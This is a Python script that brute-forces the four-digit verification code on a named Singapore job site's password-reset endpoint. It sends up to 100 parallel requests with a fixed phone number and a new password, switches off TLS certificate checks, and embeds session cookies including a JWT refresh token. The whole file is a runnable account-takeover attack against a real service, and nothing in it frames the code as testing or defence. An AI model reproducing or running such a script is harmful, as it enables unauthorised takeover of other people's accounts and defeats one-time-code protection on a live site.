import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import warnings

if hasattr(urllib3.exceptions, 'NotOpenSSLWarning'):
    warnings.filterwarnings("ignore", category=urllib3.exceptions.NotOpenSSLWarning)
# Suppress only the NotOpenSSLWarning
warnings.filterwarnings("ignore", category=urllib3.exceptions.NotOpenSSLWarning)
# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Base setup for cookies, headers, and json data
cookies = {
    '__stripe_mid': '3c44630c-f647-41b5-90db-ca4b2147316136a844',
    '__stripe_sid': 'cc1b05c7-e5fc-4734-8bf9-ba331b7279577b8ca2',
    'refresh_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTYwNDY5NjAsImlhdCI6MTcyNDUxMDk2MCwic3ViIjoiNjZjM2ZkZmFkNjBmMWUwYTM4YjdjZmE1IiwiYWRtaW4iOmZhbHNlLCJyZWYiOnRydWUsInBhc3N3b3JkX3VwZGF0ZWRfYXQiOjE3MjQ1MTA5MzkuMTY2fQ.bYAKP5vn-aN209o77D1zfaaEXkkDl3QWLWWgVM_SCCg',
}

headers = {
    'Host': 'singaporejobs.com.sg',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/json',
    'Origin': 'https://singaporejobs.com.sg',
    'Referer': 'https://singaporejobs.com.sg/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Priority': 'u=1',
}

# Function to send a single request with a specific code
def send_request(code):
    # Format the code as a four-digit string with leading zeros
    formatted_code = f"{code:04d}"

    json_data = {
        'hp_number': '91738173',
        'code': formatted_code,
        'password': 'nicewebsite',
    }

    try:
        response = requests.post(
            'https://singaporejobs.com.sg/api/v1/front/auth/set',
            cookies=cookies,
            headers=headers,
            json=json_data,
            verify=False,
        )
        print(f"Request with code {formatted_code} returned status code: {response.status_code}")
        if response.status_code == 200:
            return True  # Indicate successful request
        return False  # Indicate unsuccessful request
    except requests.exceptions.RequestException as e:
        print(f"Request with code {formatted_code} failed: {str(e)}")
        return False  # Handle the case where the request fails

# Use ThreadPoolExecutor to send requests in parallel
def send_requests_in_parallel(start, end, max_workers=100):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(send_request, code) for code in range(start, end + 1)]
        for future in as_completed(futures):
            success = future.result()
            if success:
                print("Shutting down as we received a status code 200.")
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    # Send requests with codes from 0 to 9999 using 200 threads
    send_requests_in_parallel(0, 5000, max_workers=100)
